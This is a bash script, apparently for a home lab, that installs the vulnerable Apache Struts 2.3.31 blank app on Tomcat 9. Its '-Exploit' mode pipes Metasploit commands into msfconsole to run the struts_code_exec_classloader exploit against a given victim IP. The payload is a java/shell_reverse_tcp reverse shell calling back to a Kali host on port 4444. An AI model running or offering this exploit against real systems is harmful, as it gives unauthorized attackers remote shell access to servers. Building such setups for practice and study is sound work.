#!/bin/bash

#################################################################
# Script Name    : Exploit_ApacheStruts2.sh
# Description    : This script installs Apache Struts 2 on a Tomcat server,
#                  starts and enables the Tomcat service, stops the service,
#                  and provides an option to exploit the vulnerability using Metasploit.
# Args           : -Start (to install, start and enable Tomcat)
#                  -Stop (to stop the Tomcat service)
#                  -Exploit (to exploit the vulnerability using Metasploit)
# Author         : Jon David
# Date           : [7/7/2024]
# Date           : [Today's Date]
# Examples       :
#                  1. To install Apache Struts 2, start and enable Tomcat:
#                     ./Exploit_ApacheStruts2.sh -Start
#
#                  2. To stop the Tomcat service:
#                     ./Exploit_ApacheStruts2.sh -Stop
#
#                  3. To exploit the vulnerability using Metasploit:
#                     ./Exploit_ApacheStruts2.sh -Exploit <victim_ip> <kali_ip>
#################################################################

# Function to install and enable Apache Struts 2
install_and_enable() {
  # Update package list and install Tomcat 9
  sudo apt-get update
  sudo apt-get install -y tomcat9

  # Download Apache Struts 2
  wget https://archive.apache.org/dist/struts/2.3.31/struts-2.3.31-all.zip

  # Unzip the downloaded file
  unzip struts-2.3.31-all.zip

  # Change directory to the extracted folder
  cd struts-2.3.31

  # Copy the struts2-blank application to the Tomcat webapps directory
  sudo cp -r apps/struts2-blank /var/lib/tomcat9/webapps/

  # Start and enable Tomcat service
  sudo systemctl start tomcat9
  sudo systemctl enable tomcat9

  # Print success message
  echo "Apache Struts 2 has been installed and Tomcat has been started and enabled."
}

# Function to stop the Tomcat service
stop_service() {
  sudo systemctl stop tomcat9
  echo "Tomcat service has been stopped."
}

# Function to exploit the vulnerability using Metasploit
exploit_vulnerability() {
  local victim_ip="$1"
  local kali_ip="$2"
  local target_uri="/struts2-blank/example/HelloWorld.action"
  local rport=8080
  local lport=4444

  # Check if Metasploit is installed
  if ! command -v msfconsole &> /dev/null
  then
    echo "Metasploit is not installed. Please install Metasploit to proceed."
    exit 1
  fi

  # Generate Metasploit commands
  msf_commands=$(cat <<-END
use exploit/multi/http/struts_code_exec_classloader
set RHOST $victim_ip
set RPORT $rport
set TARGETURI $target_uri
set payload java/shell_reverse_tcp
set LHOST $kali_ip
set LPORT $lport
exploit
END
)

  # Run Metasploit commands
  echo "$msf_commands" | msfconsole -q
}

# Main script logic
if [ "$1" == "-Start" ]; then
  install_and_enable
elif [ "$1" == "-Stop" ]; then
  stop_service
elif [ "$1" == "-Exploit" ]; then
  if [ -z "$2" ] || [ -z "$3" ]; then
    echo "Usage: $0 -Exploit <victim_ip> <kali_ip>"
    exit 1
  fi
  exploit_vulnerability "$2" "$3"
else
  echo "Usage: $0 -Start | -Stop | -Exploit <victim_ip> <kali_ip>"
  echo "  -Start : Install Apache Struts 2 and start and enable Tomcat service"
  echo "  -Stop  : Stop the Tomcat service"
  echo "  -Exploit : Exploit the vulnerability using Metasploit (requires victim_ip and kali_ip)"
fi

